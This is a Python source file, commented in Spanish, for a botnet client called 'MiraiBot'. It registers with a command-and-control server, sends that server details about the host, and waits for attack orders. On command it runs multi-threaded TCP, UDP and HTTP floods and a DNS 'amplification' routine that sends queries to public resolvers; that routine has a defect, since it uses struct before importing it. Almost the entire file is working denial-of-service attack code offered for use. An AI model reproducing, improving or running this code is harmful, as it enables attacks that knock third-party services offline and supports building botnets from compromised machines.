#!/usr/bin/env python3
import socket
import threading
import time
import random
import ssl
import sys
import os
from concurrent.futures import ThreadPoolExecutor
import urllib.request
import urllib.error

class MiraiBot:
    def __init__(self, cnc_host, cnc_port=14037):
        self.cnc_host = cnc_host
        self.cnc_port = cnc_port
        self.bot_id = None
        self.arch = self.get_architecture()
        self.running = True
        self.attacking = False
        self.attack_threads = []
        self.sock = None
        self.last_heartbeat = time.time()
        
        # Configuración optimizada para VPS
        self.thread_pool = ThreadPoolExecutor(max_workers=500)
        self.user_agents = self.load_user_agents()
        
    def get_architecture(self):
        """Detecta arquitectura sin requerir root"""
        import platform
        
        # Primero intenta con lscpu si está disponible
        try:
            import subprocess
            result = subprocess.run(['lscpu'], capture_output=True, text=True, timeout=2)
            if 'aarch64' in result.stdout:
                return 'aarch64'
            elif 'armv7' in result.stdout:
                return 'arm7'
            elif 'armv6' in result.stdout:
                return 'arm6'
            elif 'x86_64' in result.stdout:
                return 'x86_64'
        except:
            pass
        
        # Fallback a platform
        machine = platform.machine().lower()
        if 'x86_64' in machine or 'amd64' in machine:
            return 'x86_64'
        elif 'x86' in machine or 'i386' in machine or 'i686' in machine:
            return 'x86'
        elif 'aarch64' in machine or 'arm64' in machine:
            return 'aarch64'
        elif 'armv7' in machine:
            return 'arm7'
        elif 'armv6' in machine:
            return 'arm6'
        elif 'mips' in machine:
            return 'mips'
        elif 'mipsel' in machine:
            return 'mipsel'
        return 'unknown'
    
    def load_user_agents(self):
        """Lista de User-Agents para ataques HTTP"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'curl/7.68.0',
            'python-requests/2.25.1',
            'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0'
        ]
    
    def connect_to_cnc(self):
        """Conecta al panel CNC"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(30)
            self.sock.connect((self.cnc_host, self.cnc_port))
            
            # Enviar heartbeat
            heartbeat_msg = f"HEARTBEAT:{self.arch}\n"
            self.sock.send(heartbeat_msg.encode())
            
            # Recibir ID
            response = self.sock.recv(1024).decode()
            if response.startswith("BOT_ID"):
                self.bot_id = response.split()[1]
                print(f"[+] Conectado como Bot ID: {self.bot_id}")
            
            # Enviar info del sistema
            sys_info = {
                'arch': self.arch,
                'os': os.name,
                'user': os.getenv('USER', 'unknown'),
                'version': '1.0',
                'cpus': os.cpu_count() or 1
            }
            import json
            info_msg = f"INFO:{json.dumps(sys_info)}\n"
            self.sock.send(info_msg.encode())
            
            return True
            
        except Exception as e:
            print(f"[-] Error conectando: {e}")
            return False
    
    def tcp_flood(self, target, port, duration):
        """TCP Flood sin root usando múltiples conexiones"""
        end_time = time.time() + duration
        
        def worker(worker_id):
            packets_sent = 0
            while time.time() < end_time and self.attacking:
                try:
                    # Crear nueva conexión cada vez
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    
                    # Intentar conectar (SYN flood)
                    sock.connect((target, port))
                    packets_sent += 1
                    
                    # Enviar algunos datos aleatorios
                    sock.send(random._urandom(1024))
                    time.sleep(0.01)  # Pequeña pausa
                    
                    sock.close()
                    
                    # Reportar cada 100 paquetes
                    if packets_sent % 100 == 0:
                        print(f"[TCP Worker {worker_id}] Enviados {packets_sent} paquetes")
                        
                except:
                    # Fallo rápido y reintento
                    try:
                        sock.close()
                    except:
                        pass
                    time.sleep(0.001)
            
            return packets_sent
        
        print(f"[TCP] Iniciando ataque a {target}:{port}")
        
        # Usar múltiples workers
        workers = 200  # Número alto pero manejable
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(worker, i) for i in range(workers)]
            total_packets = sum(f.result() for f in futures if f.result())
        
        print(f"[TCP] Total paquetes enviados: {total_packets}")
    
    def udp_flood(self, target, port, duration):
        """UDP Flood optimizado para alto throughput"""
        end_time = time.time() + duration
        
        def udp_worker(worker_id):
            packets_sent = 0
            bytes_sent = 0
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Pre-generar payloads
                payloads = [random._urandom(1400) for _ in range(50)]
                
                while time.time() < end_time and self.attacking:
                    # Enviar ráfaga de paquetes
                    for _ in range(100):
                        payload = random.choice(payloads)
                        try:
                            sock.sendto(payload, (target, port))
                            packets_sent += 1
                            bytes_sent += len(payload)
                        except:
                            break
                    
                    # Pequeña pausa para evitar bloqueo
                    time.sleep(0.001)
                    
                    # Reporte periódico
                    if packets_sent % 10000 == 0:
                        mb_sent = bytes_sent / (1024 * 1024)
                        print(f"[UDP Worker {worker_id}] {packets_sent} paquetes, {mb_sent:.2f} MB")
                
                sock.close()
                
            except Exception as e:
                print(f"[UDP Worker {worker_id}] Error: {e}")
            
            return packets_sent, bytes_sent
        
        print(f"[UDP] Iniciando ataque a {target}:{port}")
        
        # Usar múltiples workers para UDP
        workers = 100
        total_packets = 0
        total_bytes = 0
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(udp_worker, i) for i in range(workers)]
            for future in futures:
                try:
                    packets, bytes_sent = future.result(timeout=duration + 1)
                    total_packets += packets
                    total_bytes += bytes_sent
                except:
                    pass
        
        mb_total = total_bytes / (1024 * 1024)
        print(f"[UDP] Total: {total_packets} paquetes, {mb_total:.2f} MB")
    
    def http_flood(self, target, port, duration):
        """HTTP Flood con múltiples conexiones concurrentes"""
        end_time = time.time() + duration
        target_url = f"http://{target}:{port}/"
        
        def http_worker(worker_id):
            requests_sent = 0
            
            while time.time() < end_time and self.attacking:
                try:
                    # Crear request con User-Agent aleatorio
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0'
                    }
                    
                    req = urllib.request.Request(target_url, headers=headers)
                    
                    # Enviar request rápidamente
                    try:
                        response = urllib.request.urlopen(req, timeout=5)
                        response.read(1024)  # Leer un poco de respuesta
                        response.close()
                    except:
                        # Ignorar errores, solo queremos enviar tráfico
                        pass
                    
                    requests_sent += 1
                    
                    # Reporte periódico
                    if requests_sent % 100 == 0:
                        print(f"[HTTP Worker {worker_id}] {requests_sent} requests")
                    
                    # Pequeña pausa
                    time.sleep(0.01)
                    
                except Exception as e:
                    print(f"[HTTP Worker {worker_id}] Error: {e}")
                    time.sleep(0.1)
            
            return requests_sent
        
        print(f"[HTTP] Iniciando ataque a {target}:{port}")
        
        workers = 300  # Muchas conexiones HTTP concurrentes
        total_requests = 0
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(http_worker, i) for i in range(workers)]
            for future in futures:
                try:
                    total_requests += future.result(timeout=duration + 1)
                except:
                    pass
        
        print(f"[HTTP] Total requests: {total_requests}")
    
    def dns_amplification(self, target, port, duration):
        """Ataque DNS amplification usando resolvers públicos"""
        end_time = time.time() + duration
        
        # Lista de DNS resolvers públicos
        dns_servers = [
            '8.8.8.8',        # Google
            '8.8.4.4',        # Google
            '1.1.1.1',        # Cloudflare
            '1.0.0.1',        # Cloudflare
            '9.9.9.9',        # Quad9
            '149.112.112.112', # Quad9
            '64.6.64.6',      # Verisign
            '64.6.65.6',      # Verisign
            '208.67.222.222', # OpenDNS
            '208.67.220.220', # OpenDNS
        ]
        
        # Queries para amplification
        domains = [
            'cloudflare.com',
            'google.com',
            'youtube.com',
            'facebook.com',
            'amazon.com',
            'twitter.com',
            'instagram.com',
            'microsoft.com',
            'apple.com',
            'netflix.com'
        ]
        
        def dns_worker(worker_id):
            packets_sent = 0
            
            while time.time() < end_time and self.attacking:
                try:
                    # Crear socket UDP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    
                    # Construir query DNS
                    transaction_id = random.randint(1, 65535)
                    
                    # Encabezado DNS (standard query)
                    header = struct.pack('!HHHHHH', 
                        transaction_id,    # Transaction ID
                        0x0100,            # Flags (standard query)
                        0x0001,            # Questions
                        0x0000,            # Answer RRs
                        0x0000,            # Authority RRs
                        0x0000             # Additional RRs
                    )
                    
                    # Query para un dominio grande
                    domain = random.choice(domains)
                    query_parts = []
                    for part in domain.split('.'):
                        query_parts.append(len(part).to_bytes(1, 'big'))
                        query_parts.append(part.encode())
                    query_parts.append(b'\x00')
                    
                    query = b''.join(query_parts)
                    
                    # Tipo A (0x0001), Clase IN (0x0001)
                    query += struct.pack('!HH', 0x0001, 0x0001)
                    
                    packet = header + query
                    
                    # Enviar a múltiples DNS servers
                    for dns_server in random.sample(dns_servers, 3):
                        try:
                            sock.sendto(packet, (dns_server, 53))
                            packets_sent += 1
                        except:
                            pass
                    
                    sock.close()
                    
                    # Reporte
                    if packets_sent % 1000 == 0:
                        print(f"[DNS Worker {worker_id}] {packets_sent} queries")
                    
                    time.sleep(0.001)
                    
                except Exception as e:
                    print(f"[DNS Worker {worker_id}] Error: {e}")
                    time.sleep(0.1)
            
            return packets_sent
        
        import struct
        print(f"[DNS] Iniciando amplification attack a {target}")
        
        workers = 50
        total_queries = 0
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(dns_worker, i) for i in range(workers)]
            for future in futures:
                try:
                    total_queries += future.result(timeout=duration + 1)
                except:
                    pass
        
        print(f"[DNS] Total queries enviadas: {total_queries}")
    
    def handle_attack(self, method, target, port, duration):
        """Manejador principal de ataques"""
        print(f"[+] Iniciando ataque {method} contra {target}:{port} por {duration}s")
        
        self.attacking = True
        
        # Seleccionar método
        if method == "TCP":
            self.tcp_flood(target, port, duration)
        elif method == "UDP":
            self.udp_flood(target, port, duration)
        elif method == "HTTP":
            self.http_flood(target, port, duration)
        elif method == "DNS":
            self.dns_amplification(target, port, duration)
        else:
            print(f"[-] Método desconocido: {method}")
        
        self.attacking = False
        print(f"[+] Ataque {method} completado")
    
    def stop_all_attacks(self):
        """Detener todos los ataques"""
        self.attacking = False
        print("[+] Deteniendo todos los ataques...")
        
        # Esperar a que terminen los threads
        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.attack_threads.clear()
    
    def send_heartbeat(self):
        """Envía heartbeat periódico al CNC"""
        while self.running:
            try:
                if self.sock:
                    self.sock.send(b"PONG\n")
                    self.last_heartbeat = time.time()
            except:
                pass
            time.sleep(30)
    
    def listen_for_commands(self):
        """Escucha comandos del CNC"""
        while self.running:
            try:
                if not self.sock:
                    time.sleep(5)
                    continue
                
                self.sock.settimeout(1)
                data = self.sock.recv(1024).decode()
                
                if not data:
                    # Reconectar si perdemos conexión
                    print("[-] Conexión perdida, reconectando...")
                    self.sock.close()
                    time.sleep(5)
                    self.connect_to_cnc()
                    continue
                
                commands = data.strip().split('\n')
                
                for cmd in commands:
                    cmd = cmd.strip()
                    
                    if cmd == "PING":
                        self.sock.send(b"PONG\n")
                    
                    elif cmd.startswith(".attack"):
                        # Formato: .attack METHOD TARGET PORT DURATION
                        parts = cmd.split()
                        if len(parts) == 5:
                            method = parts[1]
                            target = parts[2]
                            port = int(parts[3])
                            duration = int(parts[4])
                            
                            # Iniciar ataque en nuevo thread
                            attack_thread = threading.Thread(
                                target=self.handle_attack,
                                args=(method, target, port, duration)
                            )
                            attack_thread.daemon = True
                            attack_thread.start()
                            self.attack_threads.append(attack_thread)
                            
                            print(f"[+] Comando recibido: {cmd}")
                    
                    elif cmd == ".stop":
                        self.stop_all_attacks()
                        
                    elif cmd:
                        print(f"[DEBUG] Comando recibido: {cmd}")
                
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[-] Error en listen_for_commands: {e}")
                time.sleep(5)
    
    def run(self):
        """Función principal del bot"""
        print("[+] Iniciando Mirai Bot...")
        print(f"[+] Arquitectura: {self.arch}")
        
        # Conectar al CNC
        while not self.connect_to_cnc():
            print("[-] Reintentando conexión en 10 segundos...")
            time.sleep(10)
        
        # Iniciar heartbeat
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        
        # Escuchar comandos
        try:
            self.listen_for_commands()
        except KeyboardInterrupt:
            print("\n[+] Deteniendo bot...")
            self.running = False
            self.stop_all_attacks()
            if self.sock:
                self.sock.close()


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Mirai Bot Client')
    parser.add_argument('--cnc', required=True, help='IP del servidor CNC')
    parser.add_argument('--port', type=int, default=14037, help='Puerto CNC (default: 14037)')
    
    args = parser.parse_args()
    
    bot = MiraiBot(args.cnc, args.port)
    bot.run()
